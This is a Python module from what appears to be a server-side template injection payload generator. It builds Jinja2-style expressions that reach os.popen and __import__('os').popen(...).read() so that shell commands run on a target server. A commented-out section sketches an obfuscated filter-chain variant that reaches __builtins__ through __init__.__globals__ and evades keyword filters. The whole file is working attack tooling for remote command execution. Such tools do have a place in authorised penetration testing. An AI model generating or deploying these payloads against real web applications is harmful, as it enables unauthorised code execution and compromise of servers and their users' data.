# pylint: disable=wildcard-import,unused-wildcard-import,missing-function-docstring,unused-argument

from ..payload_gen import expression_gen, precedence
from ..rules_utils import targets_from_pattern


from ..const import *



# ---


@expression_gen
def gen_os_popen_obj_normal(context, cmd):
    return [(FUNCTION_CALL, (ATTRIBUTE, (MODULE_OS,), "popen"), [(STRING, cmd)])]


@expression_gen
def gen_os_popen_obj_eval(context, cmd):
    targets = targets_from_pattern(
        "__import__(OS).popen(CMD)", {"OS": (STRING, "os"), "CMD": (STRING, cmd)}
    )
    return [(EVAL, (EXPRESSION, precedence["function_call"], targets))]


# ---


@expression_gen
def gen_os_popen_read_normal(context, cmd):
    return [(FUNCTION_CALL, (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"), [])]


@expression_gen
def gen_os_popen_read_normal2(context, cmd):
    return [(FUNCTION_CALL, (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"), [(INTEGER, -1)])]


@expression_gen
def gen_os_popen_read_eval(context, cmd):
    targets = targets_from_pattern(
        "__import__(OS).popen(CMD).read()", {"OS": (STRING, "os"), "CMD": (STRING, cmd)}
    )
    return [
        (EVAL, (EXPRESSION, precedence["function_call"], targets)),
    ]

# TODO: fix this
# @expression_gen
# def gen_os_popen_read_mapstring(context, cmd):
#     def getattr_args(name):
#         return targets_from_pattern(
#             "*(NAMEATTR|batch(LENGTH)|map(JOIN)|listMIGHTREVERSE)",
#             {
#                 "NAMEATTR": (ENCLOSE_UNDER, precedence["filter"], (STRING, name + "attr")),
#                 "LENGTH": (INTEGER, len(name)),
#                 "JOIN": (STRING, "join"),
#                 "MIGHTREVERSE": (LITERAL, "|reverse") if len(name) >= 4 else (LITERAL, ""),
#             }
#         )
#     
#     return targets_from_pattern(
#         "THESTRING|map(ATTRINIT)|map(ATTRGLOBALS)|map(ATTRGET)(BUILTINS)|map(ATTRGET)(OS)|map(ATTRPOPEN)(CMD)|map(ATTRREAD)()",
#         {
#             "THESTRING": (ONEOF, [
#                 [(INTEGER, 0), (LITERAL, "|e")],
#                 [(INTEGER, 1), (LITERAL, "|e")],
#                 [(STRING, "a")],
#             ]),
#             "ATTRINIT": getattr_args("__init__"),
#             "ATTRGLOBALS": getattr_args("__globals__"),
#             "ATTRGET": getattr_args("get"),
#             "BUILTINS": (STRING, "__builtins__"),
#             "OS": (STRING, "os"),
#             "ATTRPOPEN": getattr_args("popen"),
#             "CMD": (STRING, cmd),
#             "ATTRREAD": getattr_args("read")
#         }
#     )
#     # "a"|map(*("__init__attr"|batch(8)|map("join")|list|reverse))|list

